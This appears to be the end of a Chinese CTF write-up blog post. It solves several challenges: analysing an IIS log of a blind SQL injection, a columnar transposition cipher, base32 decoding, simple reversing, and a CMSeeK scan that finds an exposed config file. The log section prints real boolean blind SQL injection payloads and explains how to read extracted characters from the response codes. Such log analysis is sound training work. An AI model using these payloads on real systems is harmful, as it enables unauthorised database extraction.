</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=0afe9edddd17a6829.png alt></p><h1 id=注入日志分析>注入日志分析<a hidden class=anchor aria-hidden=true href=#注入日志分析>#</a></h1><p>给了一个日志文件，<code>file data.log</code>得到是一个文本文件，直接打开，前几行是</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-3>3</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>#Software: Microsoft Internet Information Services 6.0
</span></span><span style=display:flex><span>#Version: 1.0
</span></span><span style=display:flex><span>#Date: 2015-10-21 09:16:34
</span></span></code></pre></td></tr></table></div></div><p>猜测是IIS服务器记录的流量日志， 分析前几行</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-4>4</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>2015-10-21 09:16:34 W3SVC1 192.168.1.135 GET /index.htm - 80 - 192.168.1.101 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10.10;+rv:41.0)+Gecko/20100101+Firefox/41.0 200 0 0
</span></span><span style=display:flex><span>2015-10-21 09:16:34 W3SVC1 192.168.1.135 GET /favicon.ico - 80 - 192.168.1.101 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10.10;+rv:41.0)+Gecko/20100101+Firefox/41.0 404 0 2
</span></span><span style=display:flex><span>2015-10-21 09:16:36 W3SVC1 192.168.1.135 GET /show.asp id=2 80 - 192.168.1.101 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10.10;+rv:41.0)+Gecko/20100101+Firefox/41.0 200 0 0
</span></span><span style=display:flex><span>2015-10-21 09:25:01 W3SVC1 192.168.1.135 GET /show.asp id=2%27|17|80040e14|字符串_&#39;&#39;_之前有未闭合的引号。 80 - 192.168.1.101 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10.10;+rv:41.0)+Gecko/20100101+Firefox/41.0 500 0 0
</span></span></code></pre></td></tr></table></div></div><p>可以看到就是一条条的HTTP请求，并且后面跟着状态码。继续浏览，看到<code>id</code>字段出现一些<code>SQL</code>的关键字，那么可以想到这记录的就是<code>sqlmap</code>(或许)的注入流量分析。思路就是找到关键的注入请求，文件很大，我们可以搜索<code>flag</code>试试，找到关键的请求如下</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-4>4</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>...
</span></span><span style=display:flex><span>2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2%20AND%20UNICODE%28SUBSTRING%28%28SELECT%20ISNULL%28CAST%28LTRIM%28STR%28COUNT%28DISTINCT%28theflag%29%29%29%29%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%20FROM%20tourdata.dbo.news%29%2C1%2C1%29%29%3E51|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 0
</span></span><span style=display:flex><span>2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2%20AND%20UNICODE%28SUBSTRING%28%28SELECT%20ISNULL%28CAST%28LTRIM%28STR%28COUNT%28DISTINCT%28theflag%29%29%29%29%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%20FROM%20tourdata.dbo.news%29%2C1%2C1%29%29%3E48 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 0
</span></span><span style=display:flex><span>...
</span></span></code></pre></td></tr></table></div></div><p>可以利用文本编辑器如<code>sublime text 3</code>的<code>ctrl+H</code>的替换功能， 将关键流量进行精简并<code>urldecode</code>利于分析(截取两个代表性请求)</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-2>2</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>id=2 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(LTRIM(STR(COUNT(DISTINCT(theflag)))) AS NVARCHAR(4000)),CHAR(32)) FROM tourdata.dbo.news),1,1))&gt;51|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 500 0 0
</span></span><span style=display:flex><span>id=2 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(LTRIM(STR(COUNT(DISTINCT(theflag)))) AS NVARCHAR(4000)),CHAR(32)) FROM tourdata.dbo.news),1,1))&gt;48 80 200 0 0
</span></span></code></pre></td></tr></table></div></div><p>可以看到这里是二分法盲注的HTTP请求，现在思路很明确了， 从<code>SUBSTRING(.*, 1, 1)</code>开始找，并且只要看最后几条的注入请求就可以判断出字符是多少。 比如<code>SUBSTRING(.*, 1, 1) > 48</code>的状态码是<code>200</code>，<code>SUBSTRING(.*, 1, 1) > 49</code>的状态码是<code>500</code>，那其实就可以确定字符的ascii码是49。就这样就能得到<code>theflag</code>的值。</p><h1 id=brightstar>brightstar<a hidden class=anchor aria-hidden=true href=#brightstar>#</a></h1><p><a href=https://ctf-wiki.github.io/ctf-wiki/crypto/classical/others/#_9>列移位密码</a></p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-3>3</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>snkeegt fhstetr Iedsabs tnaktrt otessha iiriwis tethees
</span></span><span style=display:flex><span>key<span style=color:#960050;background-color:#1e0010>：</span> howarey
</span></span><span style=display:flex><span>Columnar Transposition Cipher
</span></span></code></pre></td></tr></table></div></div><table><thead><tr><th>h</th><th>o</th><th>w</th><th>a</th><th>r</th><th>e</th><th>y</th></tr></thead><tbody><tr><td>3</td><td>4</td><td>6</td><td>1</td><td>5</td><td>2</td><td>7</td></tr><tr><td>I</td><td>t</td><td>i</td><td>s</td><td>o</td><td>f</td><td>t</td></tr><tr><td>e</td><td>n</td><td>i</td><td>n</td><td>t</td><td>h</td><td>e</td></tr><tr><td>d</td><td>a</td><td>r</td><td>k</td><td>e</td><td>s</td><td>t</td></tr><tr><td>s</td><td>k</td><td>i</td><td>e</td><td>s</td><td>t</td><td>h</td></tr><tr><td>a</td><td>t</td><td>w</td><td>e</td><td>s</td><td>e</td><td>e</td></tr><tr><td>b</td><td>r</td><td>i</td><td>g</td><td>h</td><td>t</td><td>e</td></tr><tr><td>s</td><td>t</td><td>s</td><td>t</td><td>a</td><td>r</td><td>s</td></tr></tbody></table><p>或者</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-10-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-10-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-10-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-10-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-10-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-10-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-10-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-10-4>4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-10-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-10-5>5</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>c<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;snkeegt fhstetr Iedsabs tnaktrt otessha iiriwis tethees&#39;</span><span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#39; &#39;</span>)
</span></span><span style=display:flex><span>k<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;howarey&#39;</span>
</span></span><span style=display:flex><span>kk<span style=color:#f92672>=</span>sorted(k)
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>join(c[kk<span style=color:#f92672>.</span>index(j)][i] <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(len(k)) <span style=color:#66d9ef>for</span> j <span style=color:#f92672>in</span> k))
</span></span><span style=display:flex><span><span style=color:#75715e># Itisofteninthedarkestskiesthatweseebrighteststars</span>
</span></span></code></pre></td></tr></table></div></div><h1 id=这是啥呀>这是啥呀<a hidden class=anchor aria-hidden=true href=#这是啥呀>#</a></h1><p>base32编码</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-2>2</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>echo MZWGCZ33MM4GENJVHBRDSNJUGAYTSOBVGZTDAYRQGIZTINLEMMZTSNJVHBRX2<span style=color:#f92672>===</span> | base32 -d
</span></span><span style=display:flex><span><span style=color:#75715e>#flag{c8b558b954019856f0b02345dc39558c}</span>
</span></span></code></pre></td></tr></table></div></div><h1 id=windows逆向>Windows逆向<a hidden class=anchor aria-hidden=true href=#windows逆向>#</a></h1><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-12-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-12-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-12-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-12-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-12-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-12-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-12-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-12-4>4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-12-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-12-5>5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-12-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-12-6>6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-12-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-12-7>7</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>s=&#39;sKfxEeft}f{gyrYgthtyhifsjei53UUrrr_t2cdsef66246087138\0087138&#39;
</span></span><span style=display:flex><span>flag=&#39;&#39;
</span></span><span style=display:flex><span>idx=[1,4,14,10,5,36,23,42,13,19,28,13,27,39,48,41,42]
</span></span><span style=display:flex><span>for i in idx:
</span></span><span style=display:flex><span>     flag+=s[i]
</span></span><span style=display:flex><span>print(flag)
</span></span><span style=display:flex><span># KEY{e2s6ry3r5s8f6
</span></span></code></pre></td></tr></table></div></div><p>得到部分flag，加上1024}得到完整flag：KEY{e2s6ry3r5s8f61024}</p><h1 id=reverseme>reverseme<a hidden class=anchor aria-hidden=true href=#reverseme>#</a></h1><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-13-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-13-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-13-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-13-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-13-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-13-3>3</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>python <span style=color:#f92672>-</span>c <span style=color:#e6db74>&#34;open(&#39;file.png&#39;,&#39;wb&#39;).write(open(&#39;reverseme&#39;,&#39;rb&#39;).read()[::-1])&#34;</span>
</span></span><span style=display:flex><span>或
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;</span>reverseme xxd <span style=color:#f92672>-</span>p <span style=color:#f92672>-</span>c1 <span style=color:#f92672>|</span> tac <span style=color:#f92672>|</span> xxd <span style=color:#f92672>-</span>p <span style=color:#f92672>-</span>r <span style=color:#f92672>&gt;</span>file<span style=color:#f92672>.</span>png
</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=b4862d8f6d4f0aca5.png alt></p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>convert -flop file.png mirror_file.png
</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=2b476d3060dc91ce3.png alt></p><h1 id=下午>下午<a hidden class=anchor aria-hidden=true href=#下午>#</a></h1><p><a href=https://github.com/Tuhinshubhra/CMSeeK>CMSeeK</a> 扫出配置文件 http://192.168.200.202//configuration.php.txt</p><p>底部有flag: <code>flag{0b58f603ff55c0c190502b44b4ffbf2c}</code></p><p>此外一些没进一步利用上的信息和部分题目的附件放在<a href=https://github.com/findneo/ctfgodown/blob/master/20180916heidun/>GiIthub</a> ，有兴趣可移步查看。</p></div><footer class=post-footer><ul class=post-tags></ul><nav class=paginav><a class=prev href=https://ret2neo.cn/post/180929-picoctf/><span class=title>« Prev</span><br><span>picoCTF-2018 解题报告</span></a>
<a class=next href=https://ret2neo.cn/post/180903-pwnhub-lhy/><span class=title>Next »</span><br><span>胖哈勃之 LHY</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://ret2neo.cn/>闲言语</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2303473689051162" crossorigin=anonymous></script><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>